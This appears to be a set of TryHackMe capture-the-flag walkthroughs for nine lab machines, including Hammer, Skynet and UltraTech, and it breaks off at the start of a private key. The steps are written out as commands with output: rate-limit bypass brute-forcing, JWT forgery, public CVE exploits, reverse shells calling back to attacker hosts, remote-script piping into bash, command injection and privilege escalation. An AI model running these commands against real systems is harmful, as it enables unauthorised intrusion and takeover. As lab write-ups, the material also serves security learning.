1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login

The application lives on the non-standard port 1337.

docs.title: Content discovery
docs.text:
ffuf -u http://10.48.170.148:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt

index.php               [Status: 200]
javascript              [Status: 301]
phpmyadmin              [Status: 301]
vendor                  [Status: 301]

index.php is a login form, so the page source is checked for hints before brute-forcing anything.

docs.title: 2. Recon of the login flow
docs.text:
Viewing the page source of index.php leaves a developer note behind:

<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->

That naming convention is used to fuzz a second time, scoped to hmr_* directories:

ffuf -u http://10.48.170.148:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/big.txt

css                     [Status: 301]
images                  [Status: 301]
js                      [Status: 301]
logs                    [Status: 301]

hmr_logs is readable and leaks an email address, tester@hammer.thm, inside an Apache error log — that becomes the account to attack:

[authz_core:error] ... user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch

docs.title: 3. Foothold, part 1 — brute-forcing the password reset
docs.text:
The site's Forgot your password? link leads to a reset flow that emails (or in this lab, silently accepts) a numeric recovery code:

Submitting the email returns a 302 with a Rate-Limit-Pending header, meaning the endpoint throttles by client — and that rate limit trusts X-Forwarded-For, which the client fully controls:

A 4-digit recovery code space (0000–9999) is combined with a list of spoofed source IPs in a pitchfork ffuf attack, so each guess rotates to a fresh X-Forwarded-For value and never gets rate-limited:

seq -w 0000 9999 > codes.txt
for i in {1..10000}; do printf "%d.%d.%d.%d\n" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)); done > ips.txt

ffuf \
  -w codes.txt:W1 \
  -w ips.txt:W2 \
  -u "http://10.48.170.148:1337/reset_password.php" \
  -X POST \
  -d "recovery_code=W1&s=80" \
  -b "PHPSESSID=<session>" \
  -H "X-Forwarded-For: W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" \
  -mode pitchfork -fw 1 -rate 100 \
  -o output.json -of json

[Status: 200, Size: 2190, ...]
    * W1: 2259
    * W2: 146.102.236.14

Code 2259 is the one request that doesn't come back Invalid. It is used to reach the actual reset form and set a new password for tester@hammer.thm:

# Login as tester@hammer.thm with the new password

The dashboard confirms the login and hands back the first flag:

THM{AuthBypass3D}

docs.title: 4. Foothold, part 2 — JWT kid key forgery to bypass the command blacklist
docs.text:
The dashboard's Enter command box posts to execute_command.php carrying a JWT Authorization: Bearer token. A direct cat is blocked server-side:

{"command":"cat "}

{"error":"Command not allowed"}

So the application is blacklisting dangerous commands by string match rather than restricting what the account is allowed to do — which means forging a token with a privileged role is the way around it. Decoding the JWT shows the header carries a kid (key ID) claim used to select the HMAC secret, and it's a full file path:

{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}

{
  "data": { "user_id": 1, "email": "tester@hammer.thm", "role": "admin" }
}

Since the signing key is just read from whatever path kid names, an authenticated ls (still allowed — only certain command strings are blacklisted) is used to find a key file already sitting in the web root:

{"command":"ls"}

"output": "188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\n..."

Reading that file discloses its contents, which is exactly the HMAC secret the server will use whenever kid points at it:

With the key's path (for kid) and its content (for the signature) both known, a new JWT is forged — same kid, payload changed to "role":"admin", signed with HS256 using the recovered key — and the signature verifies:

Valid JWT · Signature Verified
kid: /var/www/html/188ade1.key
role: admin

The forged admin token is sent with the original cat request, and this time it's accepted rather than blacklisted:

{"command":"cat /home/ubuntu/flag.txt"}

{"output":"THM{RUNANYCOMMAND1337}\n"}

docs.title: Flags captured
docs.text:
THM{AuthBypass3D}
THM{RUNANYCOMMAND1337}

TryHackMe marks the room Room completed (100%) after both answers are submitted:

docs.title: Ignite
docs.text:
Room: Ignite · Difficulty: Easy · OS: Linux

A Fuel CMS box where robots.txt points straight at the admin panel, default credentials get you logged in, and a known authenticated RCE exploit for that CMS version turns the login into a shell. Root falls to a reused database password.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.150.42

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Only HTTP is exposed, so the entire attack surface is the web application.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.150.42/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

README.md               [Status: 200]
assets                  [Status: 403]
offline                 [Status: 200]
robots.txt              [Status: 200]
sitemap_xml             [Status: 200]

docs.title: 2. Identifying and logging into Fuel CMS
docs.text:
robots.txt discloses the path the site owner wanted hidden from search engines, which is exactly the admin path worth checking first:

User-agent: *
Disallow: /fuel/

Visiting /fuel/ shows a Fuel CMS login page. Fuel CMS ships with a well-known default account, admin / admin, and it works here:

docs.title: 3. Foothold — Fuel CMS 1.4.1 RCE
docs.text:
With the CMS identified and an authenticated session available, searchsploit is checked for public exploits matching the version:

searchsploit 'fuel cms 1.4'

fuel CMS 1.4.1 - Remote Code Execution (1)                     | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                      | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                      | php/webapps/50477.py

Fuel CMS 1.4.1 has a known authenticated RCE (it evaluates PHP inside page-preview parameters), so the third exploit is run against the target with the default credentials already known to work:

python3 50477.py -u http://10.48.150.42/

[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

This gives an interactive command-execution primitive as the web server user. A standard mkfifo reverse shell upgrades that to a real shell:

Enter Command $rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f

docs.title: Stabilizing the shell
docs.text:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
reset

docs.title: User flag
docs.text:
cat /home/www-data/flag.txt

6470e394cbf6dab6a91682cc8585059b

docs.title: 4. Privilege escalation — reused database password
docs.text:
Fuel CMS's own database config file is readable and stores the MySQL credentials in plaintext, which is worth checking for password reuse against system accounts:

cat /var/www/html/fuel/application/config/database.php

$db['default'] = array(
    ...
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);

The database password mememe is tried against su root, and it works:

su root

docs.title: Root flag
docs.text:
cd /root
cat root.txt

b9bbcb33e11b80be759c4e844862482d

docs.title: Lazy Admin
docs.text:
Room: Lazy Admin · Difficulty: Easy · OS: Linux

A SweetRice CMS install leaves a full SQL backup sitting in a browsable directory, and that backup contains the admin panel's MD5 password hash. Cracking it gets CMS access, and a public authenticated file-upload exploit for this exact SweetRice version turns that login into a reverse shell. Root comes from a sudo-allowed Perl script that simply calls a world-writable shell script.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.49.155.207

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

docs.title: Content discovery
docs.text:
ffuf -u "http://10.49.155.207/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

content                 [Status: 301]

ffuf -u "http://10.49.155.207/content/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

_themes                 [Status: 200]
as                      [Status: 200]
attachment              [Status: 200]
images                  [Status: 200]
inc                     [Status: 200]
js                      [Status: 200]

docs.title: 2. Finding the CMS and its leaked backup
docs.text:
/content/_themes/ is directory-listable and shows a default theme folder, confirming a themed CMS install:

/content/as/ is the CMS's admin login page:

/content/inc/ is also directory-listable, and includes a suspicious mysql_backup/ folder sitting right in the web root:

Fetching the .sql file inside it dumps the entire database, including the %_options table that stores the admin account:

curl http://10.49.155.207/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql

INSERT INTO `%--%_options` VALUES('1','global_setting','a:17:{...
  s:5:\"admin\";s:7:\"manager\";
  s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\";
  ...}','1575023409');


username: manager
password hash (MD5): 42f749ade7f9e195bf475f37a44cafcb

docs.title: Cracking the hash
docs.text: 42f749ade7f9e195bf475f37a44cafcb -> Password123

docs.title: Logging in
docs.text:
curl -i 'http://10.49.155.207/content/as/?type=signin&timeStamp=<ts>' \
  --data 'user=manager&passwd=Password123&rememberMe='

{"status":1,"statusInfo":"Login success"}

docs.title: 3. Foothold — authenticated SweetRice RCE
docs.text:
SweetRice 1.5.1 has a known authenticated file-upload RCE: a malicious ZIP uploaded through the media center auto-extracts, and a PHP shell hidden inside survives the extraction and lands in a web-accessible path:

python3 exploit.py \
  --target-ip 10.49.155.207 \
  --username manager \
  --password Password123 \
  --attacker-ip 192.168.158.240 \
  --port 4444 \
  --zip shell.zip

SweetRice CMS (1.5.1) Remote Code Execution (Authenticated)
{"status":1,"statusInfo":"Login success"}
[+] Payload uploaded successfully
[+] Found payload: a1475d0bb744760fd4bc8b611492f759.php
[+] Triggering reverse shell...

docs.title: Stabilizing the shell
docs.text:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
reset

docs.title: User flag
docs.text:
cd /home/itguy
cat user.txt

THM{63e5bce9271952aad1113b6f1ac28a07}

docs.title: 4. Privilege escalation — writable backup script
docs.text:
sudo -l

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

cat /home/itguy/backup.pl

#!/usr/bin/perl
system("sh", "/etc/copy.sh");

backup.pl runs as root with no password, and it just calls /etc/copy.sh — which is itself world-writable:

ls -la /etc/copy.sh
cat /etc/copy.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

Overwriting that script with a reverse shell pointed at the attacker and triggering the sudo Perl script runs it as root:

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.158.240 5555 >/tmp/f' > /etc/copy.sh

nc -lvnp 5555

sudo /usr/bin/perl /home/itguy/backup.pl

docs.title: Root flag
docs.text:
cd /root
cat root.txt

THM{6637f41d0177b6f37cb20d775124699f}

docs.title: Oh My WebServer
docs.text:
Room: Oh My WebServer · Difficulty: Medium · OS: Linux

The front-end is Apache 2.4.49, vulnerable to the path-traversal RCE pair CVE-2021-41773 / CVE-2021-42013. That gets a shell inside a Docker container, where a Linux capability left on python3 (cap_setuid) is enough to become root inside the container. From there, scanning the Docker bridge network finds a second host running Microsoft's OMI agent, vulnerable to CVE-2021-38647 ("OMIGOD") — an unauthenticated RCE that hands over root on the real target directly.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -A -sV -Pn -oA nmap_full_scan 10.48.171.237

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods:
|_  Potentially risky methods: TRACE

Apache 2.4.49 is the detail that matters — this version introduced the path-traversal RCE later patched (incompletely, then fully) as CVE-2021-41773/42013.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.148.203/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

assets                  [Status: 200]
cgi-bin/                [Status: 403]

A reachable cgi-bin/ is exactly what the Apache 2.4.49/2.4.50 exploit needs — the vulnerable path-normalization bug lives in the CGI request-handling path.

docs.title: 2. Foothold — Apache path traversal RCE (CVE-2021-41773 / CVE-2021-42013)
docs.text:
searchsploit 'Apache 2.4.49'

Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)   | multiple/webapps/50383.sh

A public PoC implementing both the path-traversal read and, when mod_cgi is enabled, full RCE is used directly against the target:

python3 exploit.py 10.49.160.33 80 rce 'id'

[i] Host appears to be vulnerable.
[*] Working Payload: http://10.49.160.33:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

bash -c 'bash -i >& /dev/tcp/192.168.158.240/4444 0>&1'

docs.title: 3. Container root — a cap_setuid python3 binary
docs.text:
Running linpeas.sh inside the shell flags a Linux capability left on the Python interpreter — functionally similar to a SUID bit, but scoped to a specific privileged syscall:

curl http://192.168.158.240:8000/linpeas.sh | bash


Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep

cap_setuid lets the binary call setuid() to become any user, including root, without needing full SUID:

python3

>>> import os
>>> os.setuid(0)
>>> os.system('/bin/sh')

# whoami
root

docs.title: User flag (this container)
docs.text:
cd /root
cat user.txt

THM{eacffefe1d2aafcc15e70dc2f07f7ac1}

docs.title: 4. Pivoting to the internal host
docs.text:
Root inside this container is still just root of a container, confirmed by the fact that the attack surface so far has only ever been this one host. Scanning the Docker bridge gateway (172.17.0.1) for other machines on the internal network is the natural next step — an nmap binary is fetched since the container doesn't have one:

curl http://192.168.158.240:8000/nmap > nmap
chmod +x nmap
./nmap 172.17.0.1 -p- --min-rate 1000

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown

Port 5986 open on an internal Linux host, alongside the WinRM-style 5985, is the signature of Microsoft's Open Management Infrastructure (OMI) agent — vulnerable, in versions before 1.6.8-1, to CVE-2021-38647 ("OMIGOD"), an unauthenticated remote code execution over its HTTPS management port.

curl http://192.168.158.240:8000/omigod.py > omi.py
python3 omi.py -t 172.17.0.1 -c id

uid=0(root) gid=0(root) groups=0(root)

OMIGOD runs its payload as root directly — no privilege escalation step needed on this host.

docs.title: Root flag
docs.text:
python3 omi.py -t 172.17.0.1 -c "cat /root/root.txt"

THM{7f147ef1f36da9ae29529890a1b6011f}

docs.title: Pickle Rick
docs.text:
Room: Pickle Rick · Difficulty: Easy · OS: Linux

Rick has turned himself into a pickle and needs three secret ingredients to turn back. The box is a single web app whose "Command Panel" runs whatever you type on the server, so the whole challenge is: find the portal login, get in, and use the panel (plus a sudo misconfiguration) to read all three ingredient files.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.160.230

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Only SSH and HTTP are exposed, and there are no credentials for SSH yet, so the web server on port 80 is the way in.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.160.230/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

assets                  [Status: 200]
robots.txt              [Status: 200]
server-status           [Status: 403]

robots.txt and /assets stand out and are checked next.

docs.title: 2. Harvesting credentials
docs.text:
The home page is a Rick-and-Morty themed app. Viewing its HTML source exposes a username left behind in a comment — the first half of the login:

Username: R1ckRul3s

The password is hiding in plain sight in robots.txt:

Wubbalubbadubdub

Browsing /assets just confirms it is a static resource directory (images, CSS, JS) with nothing sensitive:

docs.title: 3. Finding and using the login portal
docs.text:
Requesting /portal.php directly returns a 302 redirect to /login.php, which tells us the portal is gated behind authentication:

Logging in at /login.php with the harvested R1ckRul3s / Wubbalubbadubdub grants access to the portal:

The portal exposes a Command Panel — an input box whose contents are executed on the server and the output rendered back. Running ls lists the web root and reveals the first ingredient file:

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

cat Sup3rS3cretPickl3Ingred.txt returns the first ingredient. (The app blocks cat, so less, grep, head or tail are used instead where needed.)

docs.title: 4. Privilege abuse via sudo
docs.text:
The remaining ingredients live in other users' home directories and in /root. Checking the command user's sudo rights shows it can run anything as root without a password:

User www-data may run the following commands on ip-10-48-160-230:
    (ALL) NOPASSWD: ALL

That single misconfiguration makes the rest trivial — prefix any read with sudo. The second ingredient comes from Rick's home directory:

sudo less "/home/rick/second ingredients"
# -> 1 jerry tear

And the third ingredient from root-owned storage:

sudo strings /root/3rd.txt
# -> 3rd ingredients: fleeb juice

All three ingredients are recovered and the room is complete.

docs.title: Why the attack works
docs.text:
• Secrets in client-visible content. The username is in an HTML comment and the password in robots.txt — both served to any visitor. Credentials should never be embedded in source, comments or crawler files.
  • Command execution by design. The panel passes user input to a shell with no allow-listing, giving arbitrary RCE to anyone who logs in.
  • NOPASSWD: ALL sudo. The web user can become root at will, so a web-app compromise is instantly a full host compromise. sudo grants should be scoped to specific, non-shell binaries.

docs.title: RootMe
docs.text:
Room: RootMe · Difficulty: Easy · OS: Linux

A beginner box built around two classic mistakes: a file-upload form that blocks only the .php extension, and a SUID bit left on the Python interpreter. Upload a PHP reverse shell under an alternative extension, catch it as www-data, then use python2.7 to call setuid(0).

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.139.101

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?

Only SSH and HTTP are open, and there are no credentials for SSH yet, so the web server is the target.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.139.101/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

css                     [Status: 200]
js                      [Status: 200]
panel                   [Status: 200]
server-status           [Status: 403]
uploads                 [Status: 200]

/panel (an upload form) and /uploads (where uploaded files are stored) are the pair that matters: if the upload accepts server-side code and /uploads serves it back, that is remote code execution.

docs.title: 2. Foothold — bypassing the upload filter
docs.text:
/panel/ offers a file-upload form. A stock PHP reverse shell (reverse.php) is selected:

Uploading it with a .php extension is rejected, which shows the filter is only a blacklist on the literal .php extension. Apache's PHP handler on this box, however, also executes alternate extensions such as .php5. Intercepting the request in Burp and renaming the upload to reverse.php5 passes the filter, and the server's success response links to ../uploads/reverse.php5:

The /uploads/ directory listing confirms the file landed there and is reachable:

With a listener running, requesting /uploads/reverse.php5 triggers the payload:

nc -lvnp 4444

connect to [192.168.158.240] from (UNKNOWN) [10.48.139.101] 43444
uid=33(www-data) gid=33(www-data) groups=33(www-data)

docs.title: User flag
docs.text:
cd /var/www
cat user.txt

THM{y0u_g0t_a_sh3ll}

docs.title: 3. Privilege escalation — SUID python2.7
docs.text:
SUID binaries run with the owning user's privileges (here, root) no matter who executes them, so they're the first thing to check:

find / -perm -4000 -type f 2>/dev/null

Among the standard system SUID binaries, /usr/bin/python2.7 stands out — an interpreter is never meant to carry the SUID bit, because it lets anyone who can run it execute arbitrary code as the file's owner.

docs.title: Root flag
docs.text:
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami

root

cd /root
cat root.txt

THM{pr1v1l3g3_3sc4l4t10n}

docs.title: Simple CTF
docs.text:
Room: Simple CTF · Difficulty: Easy · OS: Linux

A short beginner box: identify a vulnerable CMS Made Simple install, use a public SQL-injection exploit to recover a user's salted hash, crack it, log in over SSH, and escalate to root through a sudo-allowed editor.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.141.222

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

Note SSH is on the non-standard port 2222 — worth remembering for the login step later.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.141.222/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

robots.txt              [Status: 200]
simple                  [Status: 200]

docs.title: 2. Identifying the CMS
docs.text:
Visiting /simple reveals a CMS Made Simple installation:

The footer / version marker identifies it as CMS Made Simple 2.2.8:

searchsploit maps that version to a known unauthenticated SQL injection:

searchsploit 'cmsms 2.2.8'

CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py

This is CVE-2019-9053, a blind SQL injection in the News module that leaks user credentials.

docs.title: 3. Exploiting the SQL injection
docs.text:
Running the public exploit extracts the admin salt, username, email and password hash, then cracks it with a wordlist:

python3 46635.py -u http://10.48.141.222/simple --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

The salted MD5 cracks to the cleartext password for mitch:

docs.title: 4. Initial access (SSH) and user flag
docs.text:
The recovered mitch credentials work against SSH on port 2222:

ssh mitch@10.49.152.214 -p 2222

$ cat user.txt
G00d j0b, keep up!

docs.title: 5. Privilege escalation
docs.text:
Checking mitch's sudo rights shows a passwordless editor:

sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

vim is a classic GTFOBin: it can shell out, and because it runs as root the shell is root:

sudo vim -c ':!/bin/sh'

# cat /root/root.txt
W3ll d0n3. You made it!

docs.title: Why the attack works
docs.text:
• Unpatched CMS. CMS Made Simple 2.2.8 predates the CVE-2019-9053 fix, so the News module's parameter is injectable without authentication.
  • Weak, crackable hash. The salted MD5 is in rockyou's reach, turning a leaked hash into a working password.
  • sudo vim. Granting an interactive, shell-capable program via sudo is equivalent to granting a root shell. Editors like vim, less and nano should never appear in a sudoers rule.

docs.title: Skynet
docs.text:
Room: Skynet · Difficulty: Easy · OS: Linux

A Terminator-themed box where an anonymously readable SMB share leaks both a password wordlist and, later, a webmail message containing Miles Dyson's actual SMB password. That password reaches a personal Cuppa CMS install vulnerable to local file inclusion, which is enough to get a webshell and a reverse shell. Root falls to a classic tar wildcard injection in a cron-driven backup script.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.48.168.128

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X

Mail services (POP3/IMAP) plus SMB alongside a web server — worth checking SMB first, since anonymous access to Samba shares is common and fast to confirm.

docs.title: Content discovery
docs.text:
ffuf -u http://10.48.168.128/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

admin                   [Status: 301]
ai                      [Status: 301]
config                  [Status: 301]
squirrelmail            [Status: 301]

/squirrelmail confirms there's a webmail client reachable over HTTP, which lines up with the POP3/IMAP ports.

docs.title: 2. Enumerating SMB
docs.text:
smbmap -H 10.48.168.128

anonymous                                               READ ONLY       Skynet Anonymous Share
milesdyson                                              NO ACCESS       Miles Dyson Personal Share

The anonymous share is readable without credentials:

smbclient -N //10.48.168.128/anonymous

attention.txt                       N      163
logs                                D        0

get attention.txt
cat attention.txt

A recent system malfunction has caused various passwords to be changed. All skynet
employees are required to change their password after seeing this.
-Miles Dyson

The logs subfolder yields a large list of terminator-themed strings in log1.txt — effectively a custom password wordlist tailored to this box's theme, left behind (deliberately or not) for anyone who can read the share.

docs.title: 3. Webmail — wrong username, then the right one
docs.text:
With a Terminator-themed wordlist in hand, the natural account to target is Miles Dyson's SquirrelMail login. A first guess at the username fails:

So the login page itself — SquirrelMail 1.4.23 — becomes the next lead, and a public RCE advisory for that exact version is found:

That CVE turns out not to be needed here — the real path in is simpler. SMB's milesdyson share (NO ACCESS to the anonymous user) implies a valid Samba account named milesdyson, and the correct webmail username is actually mikedyson. Spraying the terminator wordlist against SquirrelMail with that username succeeds:

The inbox contains a password-reset notice — the system account's actual current SMB password:

Password: )s{A&2Z=F^n_E.B`

docs.title: 4. Accessing the personal SMB share and CMS
docs.text:
smbclient //10.48.168.128/milesdyson -U milesdyson

Password for [WORKGROUP\milesdyson]: )s{A&2Z=F^n_E.B`

Inside notes/important.txt:

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

That path leads to a personal page and, from there, a CMS admin login:

ffuf -u http://10.48.168.128/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

administrator           [Status: 301]

docs.title: 5. Foothold — Cuppa CMS LFI to RCE
docs.text:
searchsploit "cuppa"

Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion   | php/webapps/25971.txt

The alertConfigField.php script takes a path in urlConfig without sanitizing directory traversal, confirmed with a classic /etc/passwd read:

http://10.48.168.128/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd

Because the same parameter also supports a remote URL (RFI), a PHP reverse shell is hosted and included directly:

cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 8000

10.48.168.128 - - [03/Jun/2026 21:45:04] "GET /php-reverse-shell.php HTTP/1.0" 200 -

docs.title: User flag
docs.text:
cd /home/milesdyson
cat user.txt

7ce5c2109a40f958099283600a9ae807

docs.title: 6. Privilege escalation — tar wildcard injection in a cron job
docs.text:
A backup script owned by root is found in milesdyson's home directory:

cat backups/backup.sh

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

This script (run periodically as root, almost certainly via cron) calls tar with a bare * glob inside a directory the web user can write to. tar supports special filenames starting with -- as command-line options, so creating files named like options lets us smuggle flags into the privileged tar invocation — the classic tar wildcard injection:

cd /var/www/html
echo 'chmod u+s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

When tar next runs as root against /var/www/html/*, it expands those two filenames as --checkpoint=1 --checkpoint-action=exec=sh shell.sh, which makes tar execute shell.sh — as root — mid-archive:

ls -l /bin/bash

-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash

After the cron job fires, /bin/bash has gained the SUID bit:

/bin/bash -p
whoami

root

docs.title: Root flag
docs.text:
cat /root/root.txt

3f0372db24753accc7179a282cd6a949

docs.title: UltraTech
docs.text:
Room: UltraTech · Difficulty: Medium · OS: Linux

A Node.js/Express API exposes a diagnostic /ping endpoint that shells out to the system ping command without sanitizing its input — classic OS command injection. Chaining ls onto the injected command reveals an on-disk SQLite database sitting right next to the app, and its two account hashes crack instantly. One of those accounts turns out to be in the docker group, which — with no containers running but a bare bash image available locally — is enough to mount the entire host filesystem into a throwaway container and escape to root.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -oA nmap_full_scan 10.49.134.124

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Two web services: a static Apache site on 31331 and a Node/Express API on 8081.

docs.title: Content discovery
docs.text:
ffuf -u http://10.49.134.124:8081/FUZZ -w /usr/share/wordlists/dirb/big.txt -r

auth                    [Status: 200]
ping                    [Status: 500]

ffuf -u http://10.49.134.124:31331/FUZZ -w /usr/share/wordlists/dirb/big.txt -r

css                     [Status: 200]
images                  [Status: 200]
js                      [Status: 200]
robots.txt              [Status: 200]

docs.title: 2. Recon of the static site
docs.text:
robots.txt on port 31331 points to a sitemap:

Sitemap: /utech_sitemap.txt

curl http://10.49.134.124:31331/utech_sitemap.txt

/
/index.html
/what.html
/partners.html

Nothing sensitive on the static pages themselves — the interesting target is the API on 8081, and specifically its /ping endpoint, which already returned a 500 during fuzzing (a sign it's actually doing something with its input, not just 404ing).

docs.title: 3. Foothold — command injection in /ping
docs.text:
/ping clearly shells out to the system ping utility with a user-supplied ip parameter. Chaining a second command with a URL-encoded newline after a valid IP gets both executed:

GET /ping?ip=127.0.0.1%0als%20 HTTP/1.1
Host: 10.49.134.124:8081

HTTP/1.1 200 OK
X-Powered-By: Express

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.052 ms

index.js
node_modules
package.json
package-lock.json
start.sh
utech.db.sqlite

The ls output run alongside the ping shows the API's own source directory — including utech.db.sqlite, a database file sitting right in the app's working directory. The same injection technique is used to read it (e.g. via cat/base64 of the sqlite file, or further injected SQLite queries), yielding two user records:

r00t     f357a0c52799563c7c7b76c1e7543a32
admin    0d0ea5111e3c1def594c1684e3b9be84

docs.title: Cracking the hashes
docs.text:
Both are unsalted MD5 and crack instantly against an online lookup:

r00t  -> n100906
admin -> mrsheafy

docs.title: SSH as r00t
docs.text:
ssh r00t@10.49.134.124
# password: n100906
whoami

r00t

docs.title: 4. Privilege escalation — docker group escape
docs.text:
id

uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

Membership in the docker group is effectively root on the host: Docker's daemon runs as root, and any container can be started with the host filesystem bind-mounted in. No containers are currently running, but a bare bash image is already cached locally:

docker ps
docker images

REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB

Mounting the host's root filesystem into a new container and chroot-ing into it gives a root shell on the real host, not just inside the container:

docker run -v /:/mnt --rm -it bash chroot /mnt bash

root@26fe258753ae:/# whoami
root

docs.title: Confirming full host access
docs.text:
The host's root SSH private key is immediately readable from inside the chroot, confirming this is the real host filesystem and not a container sandbox:

cat /root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
